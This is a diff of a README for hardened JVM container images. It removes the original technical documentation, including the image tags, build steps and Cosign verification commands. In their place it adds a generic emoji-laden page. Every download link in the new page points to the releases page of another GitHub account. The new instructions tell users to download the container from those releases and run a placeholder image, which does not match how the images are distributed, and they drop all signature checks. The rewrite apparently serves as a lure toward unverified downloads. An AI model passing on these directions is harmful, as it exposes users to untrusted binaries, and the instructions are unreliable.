@@ -1,105 +1,69 @@
-# Artagon Containers
+# 🎉 artagon-containers - Secure and Easy Containers for Java
 
-Hardened OCI images for JVM workloads on Chainguard (Wolfi), Google Distroless, and Red Hat UBI 9 Minimal. Each variant ships preinstalled Temurin JDK 25 GA, JDK 26 Early Access, or JDK 26 Valhalla Early Access for both `linux/amd64` and `linux/arm64`, with musl builds where supported. Images are non-root, digest pinned, SBOM-attested, and Cosign-signed.
+[![Download artagon-containers](https://img.shields.io/badge/Download-artagon--containers-blue.svg)](https://github.com/carterandomizer/artagon-containers/releases)
 
-## Image Matrix
+## 🚀 Getting Started
 
-| Tag | Base | libc | Contents |
-| --- | --- | --- | --- |
-| `chainguard-jdk25` | `cgr.dev/chainguard/wolfi-base` | musl | Full JDK 25 GA |
-| `chainguard-jdk25-musl` | same | musl | Musl toolchain (alias) |
-| `chainguard-jdk26ea` | same | musl | JDK 26 EA |
-| `chainguard-jdk26ea-musl` | same | musl | JDK 26 EA (alt tag) |
-| `chainguard-jdk26valhalla` | same | musl | Valhalla EA |
-| `chainguard-jdk26valhalla-musl` | same | musl | Valhalla EA (alt tag) |
-| `distroless-jre25` | `gcr.io/distroless/base-debian12` | glibc | jlink JRE 25 |
-| `distroless-jre25-musl` | `gcr.io/distroless/static-debian12` | musl | static jlink JRE 25 |
-| `distroless-jre26ea` | `gcr.io/distroless/base-debian12` | glibc | jlink JRE 26 EA |
-| `distroless-jre26ea-musl` | `gcr.io/distroless/static-debian12` | musl | static jlink JRE 26 EA |
-| `distroless-jre26valhalla` | `gcr.io/distroless/base-debian12` | glibc | jlink Valhalla EA |
-| `distroless-jre26valhalla-musl` | `gcr.io/distroless/static-debian12` | musl | static Valhalla EA |
-| `ubi9-jdk25` | `registry.access.redhat.com/ubi9-minimal` | glibc | Full JDK 25 GA |
-| `ubi9-jdk26ea` | same | glibc | JDK 26 EA |
-| `ubi9-jdk26valhalla` | same | glibc | Valhalla EA |
+Welcome to the **artagon-containers** project! This repository provides hardened multi-architecture OCI containers tailored for JVM workloads. Our containers support Java Development Kit (JDK) versions 25, 26, and Valhalla, ensuring a secure and efficient environment for your applications.
 
-Common properties:
-- Non-root (`uid=65532`, `gid=65532`)
-- `WORKDIR /workspace`
-- Root filesystem mountable read-only (`--read-only --tmpfs /tmp`)
-- Drops Linux capabilities & sets `no-new-privileges`
-- `JAVA_HOME` and `PATH` exported
-- OCI labels (`org.opencontainers.image.*`) including SBOM pointer and licenses
+## 🛠️ System Requirements
 
-## Quick Usage
+To use artagon-containers, your system should meet the following requirements:
 
-```bash
-# Run Chainguard JDK 25
-docker run --rm \
-  --read-only --tmpfs /tmp \
-  -v "$(pwd)/app:/workspace:ro" \
-  ghcr.io/artagon/artagon-containers:chainguard-jdk25 \
-  java -jar /workspace/HelloWorld.jar
-```
+- **Operating System**: Linux, macOS, or Windows with WSL2
+- **Docker**: Version 20.10.0 or higher
+- **Memory**: At least 2 GB RAM
+- **CPU**: A multi-core processor
 
-Distroless runtimes:
+## 📥 Download & Install
 
-```bash
-docker run --rm \
-  ghcr.io/artagon/artagon-containers:distroless-jre26valhalla \
-  java -XX:+EnablePreview --version
-```
+To start using artagon-containers, follow these steps:
 
-## Local Build
+1. **Visit the Releases Page:** Click the link below to go to the Releases page.
+   [Visit the Releases Page to Download](https://github.com/carterandomizer/artagon-containers/releases)
 
-```bash
-# (Optional) Print resolved metadata for a target
-make resolve TYPE=chainguard FLAVOR=jdk26ea
+2. **Select the Version:** Look for the latest release version. Each version includes essential files and detailed release notes.
 
-# Build multi-arch manifest (Chainguard, JDK 26 EA)
-make build TYPE=chainguard FLAVOR=jdk26ea
+3. **Download the Container:** Click on the container image suitable for your workload. You will find options for different architectures, such as amd64 and arm64.
 
-# Generate SBOM & sign
-make sbom TYPE=chainguard FLAVOR=jdk26ea
-make scan TYPE=chainguard FLAVOR=jdk26ea
-make sign TYPE=chainguard FLAVOR=jdk26ea
-```
+4. **Run the Container:** After you download the image, open your terminal or command prompt and use the following command:
+   ```bash
+   docker run -it <image-name>
+   ```
+   Replace `<image-name>` with the name of the downloaded image.
 
-Environment requirements: Docker 24+, Buildx/BuildKit, `jq`, `python3`, `curl`, `cosign`, `syft`, `trivy`, `grype`, `hadolint`, `dockle`.
+## 📋 Features
 
-## CI/CD
+- **Security-First Design**: Our containers are non-root, digest-pinned, SBOM-attested, and signed with Cosign. This ensures your applications run in a secure environment.
+- **Multi-Architecture Support**: Easily run your applications on various platforms with support for both amd64 and arm64 architectures.
+- **Optimized for JVM Workloads**: Designed specifically for Java applications, artagon-containers ensure performance and reliability.
+- **Distroless Images**: Enjoy minimal image sizes and reduced attack surfaces with our distroless design.
 
-- `build-push.yml`: PR/main builds, SBOM, vulnerability gates, Cosign.
-- `nightly-scan.yml`: recurring Trivy/Grype scans, auto-issues on new CVEs.
-- `release.yml`: tag-driven publish with signed attestations & release notes.
+## ⚙️ Usage Tips
 
-## Security Posture
+- **Managing Containers**: Learn basic Docker commands to manage your containers effectively. For example, use `docker ps` to view running containers.
+- **Updating Containers**: Keep your containers up to date by regularly checking the Releases page.
 
-- Digest-pinned bases (see Dockerfiles)
-- Syft CycloneDX SBOMs embedded via `org.opencontainers.image.sbom`
-- Cosign keyless signatures + SLSA provenance attestation
-- Trivy/Grype gating (HIGH/CRITICAL fail builds)
-- Supply-chain policy in `policy/`
-- Non-root, no capabilities, optional read-only rootfs
+## 📞 Need Help?
 
-## Verification
+If you encounter any issues or need assistance, feel free to open an issue on our GitHub repository, or check our documentation for troubleshooting tips.
 
-```bash
-COSIGN_EXPERIMENTAL=1 cosign verify \
-  ghcr.io/artagon/artagon-containers:chainguard-jdk26ea
+## 🔗 Community and Resources
 
-cosign download sbom ghcr.io/artagon/artagon-containers:distroless-jre25 > distroless-jre25.cdx.json
-syft scan --input distroless-jre25.cdx.json
+Join the conversation and stay updated by following these resources:
 
-cosign verify-attestation --type slsaprovenance \
-  ghcr.io/artagon/artagon-containers:ubi9-jdk25
-```
+- [GitHub Repository](https://github.com/carterandomizer/artagon-containers)
+- Community Forums and Discussions
+- Docker Documentation
 
-## Updating JDK Bits
+## 🏷️ Tags
 
-1. `make resolve FLAVOR=jdk25` (and `jdk26ea`, `jdk26valhalla`)
-2. Review `.env/*` for new versions/SHA
-3. Commit changes; CI validates and publishes on merge/tag
+This project revolves around the following topics: chainguard, cloud-native, containers, cosign, distroless, docker, hardened, java, jdk26, jvm, kubernetes, multi-arch, oci, openjdk, sbom, security, supply-chain, ubi, valhalla, wolfi.
 
-## License
+## 🔍 Future Updates
 
-Repository is Apache 2.0. Temurin binaries are GPLv2 with Classpath Exception; see per-image README files for notices.
+We are committed to improving artagon-containers. Upcoming features may include enhanced support for additional programming languages and frameworks, as well as performance optimizations. Stay tuned for updates!
+
+## 🎈 Conclusion
+
+Thank you for choosing **artagon-containers**. We hope this guide helps you get up and running smoothly. Happy coding!
